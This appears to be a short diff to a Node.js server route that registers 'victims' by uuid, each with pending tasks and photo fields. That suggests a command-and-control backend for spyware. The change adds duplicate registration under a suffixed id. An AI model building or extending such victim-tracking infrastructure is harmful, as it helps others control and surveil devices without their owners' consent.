@@ -46,6 +46,9 @@ app.post('/registerLox', async (req,res) => {
     if (!victim) {
       victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
       console.log(req.body.uuid)
+    } else {
+      victims.push({uuid: req.body.uuid + 'X', pendingTasks: [], currentPhoto: 'none', photoId: 0})
+      console.log(req.body.uuid)
     }
     safeJson(res,req,{'ok': true, 'msg': 'a'}, 200)
   } else {
